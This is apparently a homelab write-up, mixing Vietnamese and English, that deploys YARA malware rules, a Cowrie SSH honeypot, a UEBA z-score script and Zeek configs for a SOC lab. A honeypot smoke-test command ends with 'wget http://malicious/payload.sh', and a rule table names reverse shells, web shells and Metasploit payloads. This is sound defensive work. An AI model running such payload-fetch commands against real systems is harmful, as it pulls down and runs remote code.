# Pha 14 — Advanced SOC Skills (YARA + Cowrie + UEBA + Zeek)

> 4 skill combo cover malware detection + deception + behavioral analytics + NIDS
> metadata. R15-R17 rules deployed. Total lab: 17 detection rules, 17 MITRE techniques.

**Ngày thực hiện:** 2026-07-01
**Thời gian:** ~2 giờ
**Hardware change:** +2 Docker containers (Cowrie honeypot) + 2 systemd timers (YARA, UEBA)

---

## 1. Tóm tắt

Pha 14 = 4 gói skill parallel, mỗi gói 1 CV signal khác:

- **A — YARA malware detection** — rule library (EICAR + PowerShell encoded + reverse shell netcat + LinPEAS + Metasploit + PHP web shell + ransomware note + Kali binary), systemd timer daily 03:30 scan `/tmp /opt /var/www /root`, Filebeat ship → index `yara-scan-*`. R15 rule fire khi YARA match (excluding test/EICAR).
- **C — Cowrie SSH honeypot** — Docker container port 2222/TCP public. Attacker SSH in → captured session (login, commands, malware upload). Filebeat tail `cowrie.json` docker volume → index `cowrie-*`. R16 rule fire khi login.success hoặc command.input event.
- **E — UEBA baseline anomaly** — Python script query ES aggregations 6 metrics (failed logon count, unique process image, outbound dest IP, DVWA URL count, Cowrie src_ip, Suricata unique src) → compute z-score vs 14-day baseline → flag z >= 2.0. systemd timer daily 04:00. Filebeat ship → index `ueba-*`. R17 rule fire khi `ueba.is_anomaly: true`.
- **D — Zeek NIDS complement Suricata** — Config files ready (`configs/zeek/local.zeek`, `node.cfg`, Filebeat input add-on). Deploy defer khi SOC-Tools VM online — apt install zeek → zeekctl deploy → outputs conn/http/dns/ssl/notice.log → Filebeat forward → index `zeek-<log>-*`.

---

## 2. Architecture delta

```
VPS (43.228.215.234) — new services:
  ├─ YARA scanner        systemd timer daily 03:30
  │   /opt/vnsoc-yara/yara-scan.sh — /etc/yara/rules/vnsoc-malware-rules.yar
  │   → /var/log/vnsoc-yara/scan.ndjson → Filebeat → Logstash → yara-scan-*
  │
  ├─ Cowrie honeypot     Docker :2222/TCP public (UFW allow)
  │   /var/lib/docker/volumes/cowrie_cowrie_logs/_data/cowrie.json → Filebeat → cowrie-*
  │
  ├─ UEBA baseline       systemd timer daily 04:00
  │   /opt/vnsoc-ueba/ueba-baseline.py (Python + requests + statistics)
  │   → /var/log/vnsoc-ueba/anomalies.ndjson → Filebeat → ueba-*
  │
  └─ Filebeat 8.19 (host, không container)
      3 filestream inputs → Logstash :5044 → routing 3 branch mới

SOC-Tools (deferred until VM online):
  └─ Zeek IDS side-by-side với Suricata
      /opt/zeek/logs/current/*.log → existing Filebeat → Logstash → zeek-<log>-*
```

---

## 3. Setup stages

> **Dual-path convention:** Stage 3.1-3.3 (YARA + Cowrie + UEBA) là **CLI-only** — service config file-based, không GUI. Stage 3.4 (Zeek) **CLI-only**. Kibana rule creation + data view có GUI (đã cover pha8/11).

### 3.1 YARA malware detection

**Install trên VPS:**
```bash
sudo apt install -y yara
sudo mkdir -p /etc/yara/rules /opt/vnsoc-yara /var/log/vnsoc-yara
sudo cp fim/yara/vnsoc-malware-rules.yar /etc/yara/rules/
sudo cp fim/yara/yara-scan.sh /opt/vnsoc-yara/
sudo chmod +x /opt/vnsoc-yara/yara-scan.sh
sudo cp fim/yara/vnsoc-yara.{service,timer} /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now vnsoc-yara.timer
```

**Rule library 9 rules cover:**

| Rule | MITRE | Severity |
|---|---|---|
| EICAR_Test_String | (test) | test |
| PowerShell_Encoded_Command | T1059.001 + T1027 | medium |
| Reverse_Shell_NetCat | T1059 + T1071.001 | high |
| LinPEAS_Recon_Script | T1046 + T1082 | high |
| Metasploit_MSFVenom_Payload | T1105 | critical |
| Web_Shell_PHP_Generic | T1505.003 | critical |
| Suspicious_Base64_LongString | — | low |
| Ransomware_Note_Common | T1486 | critical |
| Kali_Attack_Tools_Binary | — | high |

> ⚠️ **Lesson 1 (Pha 14):** YARA rule `Kali_Attack_Tools_Binary` ban đầu FP 177/207 vì match keyword "sqlmap"/"nikto" trong nvm openssl header files. **Fix:** require ELF (`{ 7F 45 4C 46 }`) hoặc PE (`"MZ" at 0`) magic bytes → chỉ trigger trên binary file thực. Sau tuning: 5 matches / 5 legit.

> ⚠️ **Lesson 2:** Bash script `set -euo pipefail` phá `while read` pattern qua pipe từ `yara`. `yara` exit non-zero khi có match → pipefail propagate exit → script terminate mid-loop, LOG file empty. **Fix:** bỏ `-e` khỏi set flags.

> ⚠️ **Lesson 3:** YARA CLI flags `-w` (suppress warnings) và `--no-warnings` không kết hợp — báo "too many `--no-warnings` options". Dùng riêng.

### 3.2 Cowrie SSH honeypot

**Docker compose:**
```yaml
services:
  cowrie:
    image: cowrie/cowrie:latest
    ports: ["0.0.0.0:2222:2222"]
    volumes:
      - cowrie_logs:/cowrie/cowrie-git/var/log/cowrie
      - cowrie_downloads:/cowrie/cowrie-git/var/lib/cowrie/downloads
    mem_limit: 300m
```

**Deploy:**
```bash
cd honeypot/cowrie
docker compose up -d
sudo ufw allow 2222/tcp comment "cowrie honeypot"
```

**Smoke-test từ Kali:**
```bash
sshpass -p 'admin' ssh -p 2222 root@43.228.215.234 "uname -a; wget http://malicious/payload.sh"
# Cowrie accept mọi password mặc định, capture session + commands
```

**Attacker capture log path:** `/var/lib/docker/volumes/cowrie_cowrie_logs/_data/cowrie.json`

Fields quan trọng:
- `eventid` — login.success / login.failed / command.input / session.file_upload
- `src_ip`, `src_port`
- `username`, `password` (tried creds)
- `input` (command attacker typed)
- `session` (session UUID cho pivot)

> ⚠️ **Lesson 4:** Cowrie default `docker exec cowrie tail /path/cowrie.json` fail vì container không có `tail` binary. Đọc log qua **host** docker volume path thay vì exec inside container.

### 3.3 UEBA baseline anomaly

**Python script `/opt/vnsoc-ueba/ueba-baseline.py`** query ES 6 metrics + compute z-score.

**Config:**
```bash
sudo mkdir -p /opt/vnsoc-ueba /var/log/vnsoc-ueba
sudo cp ueba/ueba-baseline.py /opt/vnsoc-ueba/
sudo bash -c "echo ES_PASS=<PWD> > /etc/vnsoc-ueba.env"
sudo cp ueba/vnsoc-ueba.{service,timer} /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now vnsoc-ueba.timer
```

**Metrics + query per metric:**

| Metric | Index | Query | Aggregation |
|---|---|---|---|
| failed_logon_count | winlogbeat-* | event.code=4625 | cardinality TargetUserName |
| process_spawn_unique_images | winlogbeat-* | event.code=1 | cardinality Image |
| outbound_dest_ips | winlogbeat-* | event.code=3 | cardinality DestinationIp |
| dvwa_unique_urls_per_client | dvwa-apache-* | * | cardinality url.original |
| cowrie_src_ips | cowrie-* | eventid=login.failed | cardinality src_ip |
| suricata_alerts_unique_src | suricata-* | event_type=alert | cardinality src_ip |

Z-score = (today - baseline_mean) / baseline_std. Threshold **>= 2.0** (2 std deviation above mean) = anomaly.

**Lab observed output (smoke-run):**
```
[process_spawn_unique_images] today=128 mean=60.7 std=52.6 z=1.28 anomaly=False
[outbound_dest_ips] today=21 mean=26.0 std=23.9 z=-0.21 anomaly=False
```

> ⚠️ **Lesson 5:** UEBA cần **≥ 3 baseline days** để compute stdev meaningful. Lab mới → nhiều metrics skip vì `days < 3`. Production cần ≥ 14 baseline days trước bật rule.

> ⚠️ **Lesson 6:** Z-score threshold 2.0 = ~5% false positive rate trên normal distribution. Production tune 3.0 để cắt noise (0.3% FP). Combine với suppression khi metric baseline stdev = 0 (constant baseline).

### 3.4 Zeek NIDS (config ready, deploy defer)

**SOC-Tools install commands (khi VM online):**
```bash
# apt install (Ubuntu 22.04)
sudo apt install -y zeek

# Edit configs
sudo cp configs/zeek/node.cfg /opt/zeek/etc/node.cfg
sudo cp configs/zeek/local.zeek /opt/zeek/share/zeek/site/local.zeek

# Deploy
sudo /opt/zeek/bin/zeekctl deploy
sudo /opt/zeek/bin/zeekctl status
```

**Filebeat input** (add block trong `configs/zeek/filebeat-soctools-add.yml` vào existing Filebeat trên SOC-Tools).

**Zeek log types shipped:**
- `conn.log` — TCP/UDP flow metadata (5-tuple + duration + bytes)
- `http.log` — HTTP request/response full context (host, URL, UA, status)
- `dns.log` — DNS queries + responses (rrname, qtype, rcode)
- `ssl.log` — TLS handshake (SNI, cert subject, JA3 fingerprint)
- `notice.log` — Zeek-detected anomalies (SSH bruteforce, cert expiry, ...)

**Index pattern:** `zeek-<log_type>-YYYY.MM.dd` (vd `zeek-conn-2026.07.01`).

**Zeek vs Suricata:**
| | Zeek | Suricata |
|---|---|---|
| Focus | Flow metadata + protocol analysis | Signature-based alert |
| Output | Structured logs (conn/http/dns/ssl) | Alert on ET rules match |
| Use case | Analyst pivot + threat hunt | Real-time detection |
| Enterprise pattern | Chạy song song (complementary) | Chạy song song |

**Deploy defer** đến khi SOC-Tools VM online.

---

## 4. Detection rules R15-R17

| Rule | Type | Query | Severity |
|---|---|---|---|
| R15 YARA Malware Detection | query | `yara.rule : * and NOT yara.severity : "test"` | critical |
| R16 Cowrie SSH Honeypot Interaction | query | `eventid : ("cowrie.login.success" OR "cowrie.command.input")` | critical |
| R17 UEBA Behavioral Anomaly | query | `ueba.is_anomaly : true` | high |

Total lab rules: **17** (R1-R17). MITRE techniques covered: **17**.

---

## 5. Files sản phẩm

| File | Nội dung |
|---|---|
| `fim/yara/vnsoc-malware-rules.yar` | 9 YARA rules |
| `fim/yara/yara-scan.sh` | Scanner + NDJSON output |
| `fim/yara/vnsoc-yara.{service,timer}` | systemd daily 03:30 |
| `fim/yara/filebeat-vpsside.yml` | Filebeat 3 inputs (yara + cowrie + ueba) |
| `honeypot/cowrie/docker-compose.yml` | Cowrie deploy |
| `ueba/ueba-baseline.py` | Python UEBA script |
| `ueba/vnsoc-ueba.{service,timer}` | systemd daily 04:00 |
| `configs/zeek/local.zeek` | Zeek site policy |
| `configs/zeek/node.cfg` | Zeek node config |
| `configs/zeek/filebeat-soctools-add.yml` | Filebeat input add-on cho SOC-Tools |
| `configs/main.conf` | 4 filter branch + 4 output index mới (yara, cowrie, ueba, zeek) |
| `pha14-results.md` | doc này |

---

## 6. Trạng thái Pha 14 cuối

| Component | Status |
|---|---|
| YARA rules + scanner + timer | ✅ deployed, 5 test matches OK |
| Cowrie honeypot Docker port 2222 | ✅ running, captured 19 events smoke-test |
| UEBA Python script + timer | ✅ deployed, 2 metrics computed (rest skipped baseline insufficient) |
| Zeek config artifacts | ✅ ready, deploy defer SOC-Tools |
| Filebeat 3 inputs (yara + cowrie + ueba) | ✅ shipping |
| Logstash 4 branch + output routes | ✅ pipeline running |
| ES indices: yara-scan-*, cowrie-*, ueba-* | ✅ ILM vnsoc-30d applied |
| Kibana data views + R15/R16/R17 rules | ✅ enabled |
| Total detection rules | **17** (R1-R17) |
| Total MITRE techniques covered | **17** |

---

## 7. Quick stats

| Metric | Value |
|---|---|
| Detection rules total | 17 (R1-R17) |
| Log source indices | 8 (winlogbeat, suricata, dvwa-apache, wazuh-alerts, syslog, docker, yara-scan, cowrie, ueba) |
| Filebeat inputs on VPS | 3 (yara + cowrie + ueba) |
| Filebeat inputs on SOC-Wazuh | 1 (wazuh alerts.json) |
| systemd timers auto-schedule | 3 (soar bridge 30s, ioc daily, yara daily, ueba daily) |
| Docker containers running | 3 (ml-url-api, n8n, cowrie) |
| Python detection code | ~250 lines (Flask ML + alert forwarder + UEBA baseline) |
| Time deploy end-to-end | ~2 giờ |
| Lessons learned | 6 new (YARA FP tuning, bash pipefail trap, YARA CLI flag conflict, Cowrie exec inside container, UEBA baseline days, z-score threshold) |

---

*Pha 14 hoàn tất. Advanced SOC skills stack. Zeek deploy pending SOC-Tools power on.*
